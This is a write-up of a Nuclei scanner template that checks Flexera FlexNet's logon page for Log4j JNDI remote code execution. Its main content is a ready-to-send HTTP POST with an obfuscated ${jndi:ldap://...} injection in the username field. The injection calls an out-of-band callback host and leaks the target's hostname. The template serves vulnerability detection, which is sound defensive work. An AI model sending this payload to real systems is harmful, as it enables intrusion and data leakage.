# Nuclei Template: Flexnet - Remote Code Execution (Apache Log4j)
**Template ID:** flexnet-log4j-rce
**Vulnerability Class:** Command Injection - Generic
**Severity:** Critical
**CWE:** CWE-77
**Source:** Nuclei Template (`flexnet-log4j-rce.yaml`)

## Vulnerability Information & PoC

## Description
Flexnet is susceptible to Log4j JNDI remote code execution.

## Steps to reproduce / Exploit Payload
```http
POST /flexnet/logon.do HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Referer: {{RootURL}}/flexnet/logon.do
Content-Type: application/x-www-form-urlencoded

action=logon&username=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}&password={{str}}&domain=FLEXnet
```

## References
- https://community.flexera.com/t5/Revenera-Company-News/Security-Advisory-Log4j-Java-Vulnerability-CVE-2021-4104-CVE/ba-p/216905
